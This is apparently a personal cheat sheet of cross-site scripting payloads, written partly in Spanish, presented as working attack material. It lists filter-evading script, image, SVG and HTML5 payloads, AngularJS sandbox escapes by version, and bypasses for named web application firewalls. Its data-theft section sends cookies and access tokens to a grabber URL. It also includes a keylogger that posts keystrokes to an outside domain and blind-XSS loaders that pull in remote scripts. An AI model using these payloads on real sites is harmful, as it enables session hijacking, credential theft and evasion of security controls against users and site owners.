![[What-is-Cross-site-Scripting-XSS-Attack-and-How-to-Fix-it_-1.jpg]]

---
# IDENTIFICAR
```JS
<script>debugger;</script>

<script>alert(document.domain.concat("\n").concat(window.origin))</script>

<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

### XSS in HTML
```JS
// Basic payload
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">

// Img payload
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>

// Svg payload
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />(`Firefox` is the only browser which allows self closing script)
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;

// Div payload
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

### XSS EN HTML5
```js
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
```


# ROBO DE DATOS
```JS
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```

### KEYLOGGER
```JS
<img src=x onerror='document.onkeypress=function(e){fetch("http://domain.com?k="+String.fromCharCode(e.which))},this.remove();'>
```


### USER AGENT
```js
<script>var i=new Image(); i.src="http://10.10.16.5:5000/?cookie="+btoa(document.cookie);</script>
```


# ANGULAR
### ALERT
```js
#1.6+
{{constructor.constructor('alert(1)')()}}
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}


#1.6
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}


#1.5-1.5.8
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}


#1.4-1.4.9
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}


#1.3.20
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}



#1.3.19
{{
    'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;
    $eval('x=alert(1)//');
}}



#1.3.3-1.3.18
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');  }}
```


# Blind XSS
```js
#1.0.1 - 1.1.5 && > 1.6.0
{{
    constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}


#Shorter 1.0.1 - 1.1.5 && > 1.6.0
{{
    $on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()
}}


#1.2.0 - 1.2.5
{{
    a="a"["constructor"].prototype;a.charAt=a.trim;
    $eval('a",eval(`var _=document\\x2ecreateElement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendChild(_);`),"')
}}


`#1.2.6 - 1.2.18
{{
    (_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("
        var _ = document.createElement(\'script\');
        _.src=\'//localhost/m\';
        document.getElementsByTagName(\'body\')[0].appendChild(_)")')()
}}


#1.2.19 (FireFox) 
{{
    toString.constructor.prototype.toString=toString.constructor.prototype.call;
    ["a",'eval("var _ = document.createElement(\'script\');
    _.src=\'//localhost/m\';
    document.getElementsByTagName(\'body\')[0].appendChild(_)")'].sort(toString.constructor);
}}
```


# WAF BYPASS
### Cloudflare
```js
<svg/onrandom=random onload=confirm(1)>
<video onnull=null onmouseover=confirm(1)>

<svg/OnLoad="`${prompt``}`">

<svg/onload=%26nbsp;alert`bohdan`+

1'"><img/src/onerror=.1|alert``>

<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
xss'"><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>

<svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f

<a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;&lpar;a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;(document.domain)&rpar;">X</a>
```

### Chrome Auditor
```js
</script><svg><script>alert(1)-%26apos%3B
```


### Incapsula WAF
```js
<svg onload\r\n=$.globalEval("al"+"ert()");>


anythinglr00</script><script>alert(document.domain)</script>uxldz
anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz


<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
```


### Akamai WAF
```js
?"></script><base%20c%3D=href%3Dhttps:\mysite>


<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
```


### WordFence WAF
```js
<a href=javas&#99;ript:alert(1)>
```


### Fortiweb WAF
```js
\u003e\u003c\u0068\u0031 onclick=alert('1')\u003e
```